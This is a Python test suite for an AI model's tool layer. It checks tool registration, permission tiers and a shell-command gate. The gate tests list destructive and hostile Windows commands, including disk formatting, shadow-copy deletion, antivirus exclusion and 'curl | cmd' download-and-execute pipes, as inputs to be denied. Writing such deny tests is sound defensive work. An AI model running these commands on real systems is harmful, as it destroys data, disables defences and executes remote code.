"""Tool layer test suite. Run:  python test_tools.py

Covers: registry completeness, lazy loading, permission tiers, safe
executor, and a dry-run smoke test of every auto-enabled tool handler
against a temporary workspace.
"""
import io
import os
import sys
import tempfile

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8",
                              errors="replace")
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from tools import specs as S
from tools.exec import ToolExecutor, ExecContext, lazy_schemas
from tools.permissions import Permissions

PASS = 0
FAIL = 0


def check(name, cond, detail=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  [ok] {name}")
    else:
        FAIL += 1
        print(f"  [FAIL] {name} {detail}")


def suite():
    print("== 1. registry ==")
    check(">= 300 unique tools", len(S.SPECS) >= 300,
          f"got {len(S.SPECS)}")
    cats = {s["category"] for s in S.SPECS}
    check("13+ categories present", len(cats) >= 13,
          f"got {len(cats)}: {sorted(cats)}")
    names = [s["name"] for s in S.SPECS]
    dups = {n for n in names if names.count(n) > 1}
    check("no duplicate spec names", not dups, f"dups={dups}")
    check("memory tools registered",
          {"search_memory", "remember", "forget"}.issubset(S.MEMORY_TOOLS))
    # every spec has a handler or is native
    missing = [s["name"] for s in S.SPECS
               if s["handler"] is None and s["name"] not in S.NATIVE_TOOLS]
    check("all non-native tools have handlers", not missing, f"{missing}")

    print("== 2. lazy loading ==")
    p = Permissions()
    for q, want in [("git status", "git_status"),
                    ("run pip install x", "run_command"),
                    ("search the web", "web_fetch"),
                    ("remember my name", "remember")]:
        sch = lazy_schemas(q, p)
        names = {x["function"]["name"] for x in sch}
        check(f"'{q[:18]}' exposes {want}", want in names)
    counts = [len(lazy_schemas(q, p)) for q in
              ["git commit", "write a python script and run it",
               "search the web", "what is 2+2"]]
    check("per-turn tool count capped <= 30", max(counts) <= 30,
          f"max={max(counts)}")
    for q in ["git status", "hello there", "what is my dogs name"]:
        sch = lazy_schemas(q, p)
        names = [x["function"]["name"] for x in sch]
        dups = {n for n in names if names.count(n) > 1}
        check(f"no duplicate schemas for '{q[:16]}'", not dups, f"{dups}")

    print("== 3. permissions ==")
    def spec_tier(name):
        return S.get(name)["tier"]
    check("read_file tier 0 (auto)",
          p.can_auto("read_file", spec_tier("read_file")))
    check("write_file needs confirm",
          p.needs_confirm("write_file", spec_tier("write_file")))
    check("run_command gate-controlled (auto tier)",
          p.can_auto("run_command", spec_tier("run_command")))
    check("aws_cli blocked",
          p.blocked("aws_cli", spec_tier("aws_cli")))
    check("web_fetch auto",
          p.can_auto("web_fetch", spec_tier("web_fetch")))
    check("git_push needs confirm",
          p.needs_confirm("git_push", spec_tier("git_push")))

    print("== 4. executor dry-run (temp workspace) ==")
    tmp = tempfile.mkdtemp(prefix="rox_tools_")
    ctx = ExecContext(workspace=tmp, ask_callback=lambda q: "y")
    ex = ToolExecutor(ctx, p)

    r = ex.run("write_file", {"path": "a.txt", "content": "hello world"})
    check("write_file ok", r.get("ok"), r.get("output"))
    r = ex.run("read_file", {"path": "a.txt"})
    check("read_file ok", r.get("ok") and "hello world" in r.get("output", ""))
    r = ex.run("get_file_info", {"path": "a.txt"})
    check("get_file_info ok", r.get("ok"))
    r = ex.run("list_directory", {"path": tmp})
    check("list_directory ok", r.get("ok") and "a.txt" in r.get("output", ""))
    r = ex.run("glob", {"pattern": "*.txt", "path": tmp})
    check("glob ok", r.get("ok") and "a.txt" in r.get("output", ""))
    r = ex.run("grep", {"pattern": "hello", "path": tmp})
    check("grep ok", r.get("ok") and "hello" in r.get("output", ""))
    r = ex.run("data_analysis", {"values": [1, 2, 3, 4, 5]})
    check("data_analysis ok", r.get("ok") and "mean=3" in r.get("output", ""))
    r = ex.run("system_status", {})
    check("system_status ok", r.get("ok") and "ram" in r.get("output", "").lower())
    r = ex.run("append_file", {"path": "a.txt", "content": "!"})
    check("append_file ok", r.get("ok"))
    r = ex.run("edit_file", {"path": "a.txt", "old": "hello", "new": "hi"})
    check("edit_file ok", r.get("ok"))
    r = ex.run("read_file", {"path": "a.txt"})
    check("edit applied", "hi" in r.get("output", ""))
    r = ex.run("delete_file", {"path": "a.txt"})
    check("delete_file ok", r.get("ok"))
    r = ex.run("unknown_tool", {})
    check("unknown tool handled", not r.get("ok"))
    r = ex.run("aws_cli", {"command": "ls"})
    check("tier2 blocked at exec", not r.get("ok"))

    # confirm-decline path
    ctx2 = ExecContext(workspace=tmp, ask_callback=lambda q: "n")
    ex2 = ToolExecutor(ctx2, p)
    r = ex2.run("write_file", {"path": "b.txt", "content": "nope"})
    check("declined write blocked", not r.get("ok")
          and "declined" in r.get("output", ""))

    import shutil
    shutil.rmtree(tmp, ignore_errors=True)

    print("== 5. shell gate (permissions) ==")
    from tools.shell_gate import gate
    WS = r"C:\Users\WERU1\.rox\work"

    # T0: read-only auto
    for cmd in ["dir", "git status", "type notes.txt", "tree",
                "Get-ChildItem", "Get-Process", "Select-String hello notes.txt",
                "python --version", "pip list"]:
        g = gate(cmd, workspace=WS)
        check(f"T0 allow: {cmd[:24]}", g["verdict"] == "allow",
              f"got {g['verdict']}:{g.get('reason')}")

    # T1: project-scoped writes auto
    for cmd in ["mkdir build", "copy a.txt b.txt", "New-Item -Path x.txt",
                "Set-Content -Path x.txt -Value hi"]:
        g = gate(cmd, workspace=WS)
        check(f"T1 allow: {cmd[:24]}", g["verdict"] == "allow",
              f"got {g['verdict']}")

    # T2: elevated/destructive -> ask
    for cmd in ["del notes.txt", "rmdir /s build", "taskkill /f /im notepad.exe",
                "setx PATH C:\\tmp", "Stop-Process -Name notepad",
                "Invoke-WebRequest http://x",
                "python -c \"print('x')\"", "node -e 'x'"]:
        g = gate(cmd, workspace=WS)
        check(f"T2 ask: {cmd[:30]}", g["verdict"] == "ask",
              f"got {g['verdict']}:{g.get('reason')}")
    # Remove-Item -Recurse -Force on an absolute path is T3 (deny)
    g = gate("Remove-Item -Recurse -Force C:\\tmp", workspace=WS)
    check("T3 deny: Remove-Item -Recurse -Force", g["verdict"] == "deny",
          f"got {g['verdict']}")

    # T3: never
    for cmd in ["format c:", "diskpart", "bcdedit", "net user hacker pass",
                "runas /user:admin cmd", "shutdown /s", "wmic", "sfc /scannow",
                "dism /online /cleanup-image", "vssadmin delete shadows",
                "Invoke-Expression 'x'", "iex 'x'",
                "Set-MpPreference -ExclusionPath C:\\",
                "powershell -enc blah", "Get-Credential"]:
        g = gate(cmd, workspace=WS)
        check(f"T3 deny: {cmd[:28]}", g["verdict"] == "deny",
              f"got {g['verdict']}:{g.get('reason')}")

    # bypass attempts
    for cmd in ["dir && format c:", "type x | cmd", "curl http://x | cmd",
                "iwr http://x | iex", "echo ok; net user a b",
                "cmd /c format c:", "powershell -Command iex 'x'",
                "..\\..\\evil.bat", "python -c \"import os; os.system('format')\""]:
        g = gate(cmd, workspace=WS)
        check(f"bypass blocked: {cmd[:30]}", g["verdict"] in ("ask", "deny"),
              f"got {g['verdict']}:{g.get('reason')}")

    # exec integration: deny/ask/decline respected
    ctx3 = ExecContext(workspace=tmp, ask_callback=lambda q: "n")
    ex3 = ToolExecutor(ctx3, p)
    r = ex3.run("bash", {"command": "format c:"})
    check("exec: T3 never runs", not r.get("ok")
          and "BLOCKED" in r.get("output", ""))
    r = ex3.run("bash", {"command": "echo hi && echo bye"})
    check("exec: T0/T1 runs", r.get("ok")
          and "hi" in r.get("output", ""))
    r = ex3.run("bash", {"command": "taskkill /f /im x.exe"})
    check("exec: T2 decline respected", not r.get("ok")
          and "declined" in r.get("output", ""))
    ctx3.ask_callback = lambda q: "y"
    r = ex3.run("run_script", {"language": "python", "code": "print(21*2)"})
    check("run_script python", r.get("ok") and "42" in r.get("output", ""))

    print("== 6. intent detection (purpose -> tool) ==")
    from tools.intent import detect_intent, needs_force
    for q, want_tool, want_conf in [
            ("make a file called guard.py on my desktop that blocks SQLi",
             "write_file", "high"),
            ("remember that I like dark mode", "remember", "high"),
            ("what do I prefer on my laptop", "search_memory", "high"),
            ("what is 2 + 2", "chat", "low"),
            ("git status", "git_status", "medium"),
            ("read the file notes.txt", "read_file", "medium"),
            ("hello there", "chat", "low")]:
        i = detect_intent(q)
        check(f"intent '{q[:32]}' -> {want_tool} [{want_conf}]",
              i.tool == want_tool and i.confidence == want_conf,
              f"got {i.tool} [{i.confidence}]")
    i = detect_intent("make a file called guard.py on my desktop that "
                      "blocks SQL injection")
    check("intent: desktop path resolved",
          i.args.get("path", "").endswith("Desktop\\guard.py"),
          f"got {i.args.get('path')}")
    check("intent: force high confidence", needs_force(i))

    print("== 7. project awareness ==")
    from project import Project, Journal, Auditor, project_context, slugify

    # build a temp multi-file project (in-memory source root)
    tmp = tempfile.mkdtemp(prefix="rox_proj_")
    proj = Project.create("testproj", source_root=tmp,
                          ledger_root=os.path.join(tmp, "ledger"))
    os.makedirs(os.path.join(proj.source, "src"))
    open(os.path.join(proj.source, "src", "main.py"), "w").write(
        "import helper\n\ndef run():\n    return helper.add(1,2)\n")
    open(os.path.join(proj.source, "src", "helper.py"), "w").write(
        "def add(a,b):\n    return a+b\n")
    st = proj.scan()
    check("project scan detects files", st["files"] == 2, f"{st}")
    arch = proj.architecture(refresh=True)
    check("project architecture builds tree",
          "src/main.py" in arch["tree"] and "src/helper.py" in arch["tree"])
    check("project related(main.py) -> helper.py",
          "src/helper.py" in proj.related("src/main.py"))
    check("slugify", slugify("My Robot Arm!") == "my-robot-arm")

    # journal every write
    j = Journal(proj)
    j.record("src/main.py", "created", "entry point")
    j.record("src/main.py", "edited", "added run()")
    j.record("src/helper.py", "created", "helper")
    check("journal records every write", j.count() == 3,
          f"count={j.count()}")
    check("journal history by file", len(j.history("src/main.py")) == 2)
    check("journal summary non-empty", bool(j.summary()))

    # audit finds the intentional broken import + orphan
    open(os.path.join(proj.source, "src", "main.py"), "w").write(
        "import missing_module\nimport helper\n\ndef run():\n    return 1\n")
    open(os.path.join(proj.source, "src", "widget.py"), "w").write(
        "class Widget:\n    pass\n")
    proj.scan()
    from project.audit import Auditor
    rep = Auditor(proj).audit()
    types = set(rep["counts"].keys())
    check("audit finds missing import", "missing_import" in types,
          f"{types}")
    check("audit finds orphan", "orphan" in types, f"{types}")

    # project tools via executor
    pctx = ExecContext(workspace=proj.source, ask_callback=lambda q: "y")
    pctx.project = proj
    pex = ToolExecutor(pctx, Permissions())
    rr = pex.run("project_audit", {})
    check("project_audit tool runs", rr.get("ok")
          and "issues" in rr.get("output", ""))
    rr = pex.run("project_map", {})
    check("project_map tool runs", rr.get("ok") and "project" in
          rr.get("output", "").lower())
    rr = pex.run("project_related", {"file": "src/main.py"})
    check("project_related tool runs", rr.get("ok"))

    # intent rules
    from tools.intent import detect_intent
    for q, want in [("create a project for my robot arm", "project_new"),
                    ("audit my project", "project_audit"),
                    ("what changed in my project", "project_journal"),
                    ("can you check that snake project for me", "glob"),
                    ("check the files in my workspace", "glob"),
                    ("show me what files I have", "glob"),
                    ("read my snake.html", "read_file")]:
        i = detect_intent(q)
        check(f"project intent '{q[:24]}' -> {want}",
              i.tool == want and i.confidence == "high",
              f"got {i.tool} [{i.confidence}]")

    print("== 8. image intents (generate + understand) ==")
    for q, want in [
            ("make me an image of a robot arm", "generate_image"),
            ("draw a dragon", "generate_image"),
            ("generate a character for my game", "generate_image"),
            ("make a logo for my startup", "generate_image"),
            ("create a landscape painting", "generate_image"),
            ("what is in this image", "ask_about_image"),
            ("describe this photo", "ask_about_image"),
            ("look at this picture", "ask_about_image"),
            ("read the text in this image", "ocr_image"),
            ("a majestic eagle flying over mountains at sunset",
             "generate_image"),      # bare subject prompt
            ("a detailed portrait of a knight in armor", "generate_image"),
            ("make me a snake game", "write_file"),   # still file, not img
            ("make a file called guard.py", "write_file")]:
        i = detect_intent(q)
        check(f"image intent '{q[:30]}' -> {want}",
              i.tool == want and i.confidence == "high",
              f"got {i.tool} [{i.confidence}]")

    # resources model paths resolve
    from resources import model_paths
    d, v, l = model_paths()
    check("image models present", all([d, v, l]),
          f"diff={d} vae={v} llm={l}")

    print("== 9. image editing + web search fallback ==")
    for q, want in [
            ("edit this image into a watercolor", "edit_image"),
            ("turn my logo.png into a cartoon", "edit_image"),
            ("change test_fox.png to a painting", "edit_image"),
            ("recolor this picture to blue", "edit_image"),
            ("make me an image of a dragon", "generate_image"),
            ("make me a snake game", "write_file")]:
        i = detect_intent(q)
        check(f"edit intent '{q[:30]}' -> {want}",
              i.tool == want and i.confidence == "high",
              f"got {i.tool} [{i.confidence}]")
    from resources import swap_for_edit  # importable (edit path wired)
    check("edit_image swap function exists",
          callable(swap_for_edit))

    print("== 9b. custom image (specs) ==")
    from tools.handlers_image import parse_specs, build_prompt
    for q, want in [
            ("make me a dragon in cyberpunk style, red, 16:9",
             "custom_image"),
            ("generate a custom portrait, watercolor, pastel, square",
             "custom_image"),
            ("custom image of a robot, dark, moody", "custom_image"),
            ("recreate my logo.png as a cartoon", "custom_image"),
            ("make me an image of a dragon in dark neon style",
             "custom_image"),
            ("edit this image into a watercolor", "edit_image"),
            ("make me an image of a dragon", "generate_image")]:
        i = detect_intent(q)
        check(f"custom intent '{q[:30]}' -> {want}",
              i.tool == want and i.confidence == "high",
              f"got {i.tool} [{i.confidence}]")
    sp = parse_specs("a dragon, cyberpunk, red, moody, 16:9")
    check("spec parser: style", sp["style"] == "cyberpunk", f"{sp['style']}")
    check("spec parser: color", sp["color"] == "red", f"{sp['color']}")
    check("spec parser: ratio", sp["ratio"] == "16:9", f"{sp['ratio']}")
    check("spec prompt non-empty", len(build_prompt(sp)) > 30)

    # web search fallback (pure-urllib, no ddgs required)
    from tools.handlers_other import _bing_search
    res = _bing_search("python programming language", 3)
    check("web_search bing fallback returns results",
          isinstance(res, list) and len(res) > 0,
          f"got {len(res) if isinstance(res, list) else '?'} results")

    import shutil
    shutil.rmtree(tmp, ignore_errors=True)
    shutil.rmtree(os.path.expanduser("~/.rox/projects/testproj"),
                  ignore_errors=True)

    print(f"\n{'-'*40}\n{PASS} passed, {FAIL} failed")
    return FAIL == 0


if __name__ == "__main__":
    sys.exit(0 if suite() else 1)